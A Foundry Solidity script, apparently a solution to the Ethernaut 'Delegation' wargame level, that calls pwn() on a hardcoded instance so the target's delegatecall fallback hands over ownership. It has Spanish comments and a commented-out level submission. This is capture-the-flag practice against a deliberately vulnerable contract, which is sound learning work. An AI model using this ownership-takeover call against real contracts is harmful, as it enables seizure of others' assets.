// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut.sol";

contract DelegationScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        
        // Po
        address instance = 0xa81B57823402857f38f3d3410a129fC5171C6057; // TODO: Poner la direccion de la instancia del Delegation de ethernaut
        (bool sucess, bytes memory data) = address(instance).call(abi.encodeWithSignature("pwn()"));
        
        // Llamar al ethernauta con la address de la instancia para validar
        // Ethernaut ethernaut = Ethernaut(0xD991431D8b033ddCb84dAD257f4821E9d5b38C33);
        // ethernaut.submitLevelInstance(payable(instance));

        vm.stopBroadcast();
    }
}